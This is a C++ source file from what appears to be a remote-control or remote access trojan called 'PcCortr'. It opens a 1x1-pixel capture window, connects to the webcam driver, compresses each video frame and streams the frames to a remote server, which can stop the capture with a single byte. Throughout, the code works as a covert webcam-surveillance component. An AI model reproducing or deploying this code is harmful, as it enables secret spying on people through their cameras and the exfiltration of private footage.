// MyMulitTrans.cpp: implementation of the CMyMulitTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "PcCortr.h"
#include "MyMulitTrans.h"
#include "zlib.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

#pragma comment(lib,"vfw32")
#pragma comment(lib,"winmm")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CMyMulitTrans::CMyMulitTrans()
{
	hExitEvent = CreateEvent(NULL,TRUE,FALSE,NULL);
	pDesData = new BYTE[111950];
	HWND hCaphWnd = NULL;
}

CMyMulitTrans::~CMyMulitTrans()
{
	delete [] pDesData;
	CloseHandle(hExitEvent);
}

BOOL CMyMulitTrans::SleepWait()
{
	MSG  msg; 
	while(WaitForSingleObject(hExitEvent,1) 
		== WAIT_TIMEOUT) 
	{ 
		while(PeekMessage(&msg, NULL,  0, 0, PM_REMOVE)) 
		{ 
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		} 
	} 
	return TRUE;
}

//控制线程
BOOL CMyMulitTrans::StartWork(char* m_ServerAddr, 
							  int m_ServerPort, 
							  int nSend, 
							  int nRecv)
{
	//连接目标服务器,创建发送接收管道
	if(!CMyHttpPipeBase::StartWork(m_ServerAddr, 
		m_ServerPort, nSend, nRecv)) 
		return FALSE;

	if(!Initialize()) 
	{
		//只启动音频发送
		_beginthread(RecvThread,0,this);
		SleepWait();
		return FALSE;
	}

	//发送图形信息
	if(!SendData((char*) &m_BmpInfo, sizeof(BITMAPINFO)))
		return FALSE;

	//发送视力频信息
	if(StartCapture()) 
	{
		//启动状态监控线程
		_beginthread(RecvThread,0,this);
		SleepWait();
	}
	
	//关闭句柄
	StopWork();
	return TRUE;
}

void CMyMulitTrans::RecvThread(LPVOID lPvoid)
{
	CMyMulitTrans* pThis = (CMyMulitTrans*) lPvoid;
	pThis->ProcessCmd();
}

void CMyMulitTrans::ProcessCmd()
{
	char ch = 0;
	RecvData(&ch,1);

	//停止设备
	StopCapture();
	Sleep(1000);
	Destroy();
	
	//终止程序
	SetEvent(hExitEvent);
}

BOOL CMyMulitTrans::Initialize()
{
	hCaphWnd = capCreateCaptureWindow("Capture",WS_POPUP,0,0,1,1,0,0);
	if(hCaphWnd == NULL) return FALSE;

	if(!capSetUserData(hCaphWnd,this))
		return FALSE;

	if(!capSetCallbackOnVideoStream(hCaphWnd,OnCaptureVideo))
		return FALSE;
 	
	// Connect to webcam driver
	if(!capDriverConnect(hCaphWnd,0))
	{		
		hCaphWnd = NULL;
		return FALSE;
	}

	// Set the capture parameters
	if(!SetCapturePara())
	{
		capDriverDisconnect(hCaphWnd);
		return FALSE;
	}

	CAPDRIVERCAPS caps = {0};
	if(!capDriverGetCaps(hCaphWnd,	&caps, 
		sizeof(CAPDRIVERCAPS)))
	{
		capDriverDisconnect(hCaphWnd);
		return FALSE;
	}
	return TRUE;
}


BOOL CMyMulitTrans::StartCapture()
{
	return capCaptureSequenceNoFile(hCaphWnd);
}


BOOL CMyMulitTrans::StopCapture()
{
	capCaptureStop(hCaphWnd);
	capCaptureAbort(hCaphWnd);
	Sleep(500);	
	return TRUE;
}

void CMyMulitTrans::Destroy()
{
	if(hCaphWnd == NULL) return;
    
    // Stop the capturing process    
	capCaptureAbort(hCaphWnd);
          
    // Disable the callback function..
	capSetCallbackOnVideoStream(hCaphWnd, NULL);
	
	Sleep(500);	

	// Finally disconnect the driver
    capDriverDisconnect(hCaphWnd);
}


BOOL CMyMulitTrans::SetCapturePara()
{
	CAPTUREPARMS CapParms = {0};	

	if(!capCaptureGetSetup(hCaphWnd,&CapParms,sizeof(CapParms)))
		return FALSE;

	CapParms.fAbortLeftMouse = FALSE;
	CapParms.fAbortRightMouse = FALSE;
	CapParms.fYield = TRUE;
	CapParms.fCaptureAudio = FALSE;
	CapParms.wPercentDropForError = 50;

	if(!capCaptureSetSetup(hCaphWnd,&CapParms,sizeof(CapParms)))
		return FALSE;

	// Set Video Format 
	if(!capGetVideoFormat(hCaphWnd, &m_BmpInfo, sizeof(m_BmpInfo)))
		return FALSE;

	m_BmpInfo.bmiHeader.biWidth = IMAGE_WIDTH;
	m_BmpInfo.bmiHeader.biHeight = IMAGE_HEIGHT;
	return capSetVideoFormat(hCaphWnd,&m_BmpInfo,sizeof(m_BmpInfo));
}

LRESULT CALLBACK CMyMulitTrans::OnCaptureVideo(HWND hWnd,LPVIDEOHDR lphdr)
{
	CMyMulitTrans* pThis = (CMyMulitTrans *) capGetUserData(hWnd);
	if(pThis != NULL)
	{
		DWORD m_FrameLen = 111950;
		compress(pThis->pDesData , &m_FrameLen , 
			lphdr->lpData , lphdr->dwBytesUsed);
		DWORD nSize = sizeof(DWORD);
		if(!pThis->SendData((char*) &m_FrameLen, nSize)
			||!pThis->SendData((char*) pThis->pDesData, m_FrameLen))
			  return FALSE;
	}
	return TRUE;
}